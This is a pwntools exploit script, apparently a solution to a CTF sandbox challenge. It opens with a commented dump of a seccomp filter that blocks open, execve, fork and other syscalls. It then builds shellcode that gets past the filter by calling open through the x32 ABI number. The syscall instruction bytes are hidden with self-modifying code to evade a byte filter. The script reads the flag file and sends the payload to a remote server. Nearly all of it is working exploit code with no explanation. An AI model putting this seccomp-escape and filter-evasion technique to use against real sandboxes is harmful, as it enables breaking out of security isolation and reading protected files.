from pwn import *
'''
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
0002: 0x06 0x00 0x00 0x00000000  return KILL
0003: 0x20 0x00 0x00 0x00000000  A = sys_number
0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
0005: 0x06 0x00 0x00 0x00000000  return KILL
0006: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0008
0007: 0x06 0x00 0x00 0x00000000  return KILL
0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
0009: 0x06 0x00 0x00 0x00000000  return KILL
0010: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0012
0011: 0x06 0x00 0x00 0x00000000  return KILL
0012: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0014
0013: 0x06 0x00 0x00 0x00000000  return KILL
0014: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0016
0015: 0x06 0x00 0x00 0x00000000  return KILL
0016: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0018
0017: 0x06 0x00 0x00 0x00000000  return KILL
0018: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0020
0019: 0x06 0x00 0x00 0x00000000  return KILL
0020: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0022
0021: 0x06 0x00 0x00 0x00000000  return KILL
0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW
'''


p = remote("realsung.kr", 13354)
# p = process("./sandboxing5")
# e = ELF("./sandboxing5")
context.log_level = 'debug'
context.clear(arch='amd64', os='linux')

sh = "mov rax, 0x0000000067616c66\n"
sh += "push rax\n"
sh += "mov rdi, rsp\n"
sh += shellcraft.linux.syscall(2 | 0x40000000, 'rdi', 0)
sh += shellcraft.read('rax', 'rsp', 100)
sh += shellcraft.write(1, 'rsp', 100)

Rsh = asm(sh).replace(b"\x0f\x05", b"\x90\x90")

shell = """
dec QWORD PTR [rip + 0x1]
clts
"""
shell = asm(shell)

Rsh = Rsh.replace(b"\x90\x90", shell)

print(disasm(Rsh))

p.sendafter('>',Rsh)

p.interactive()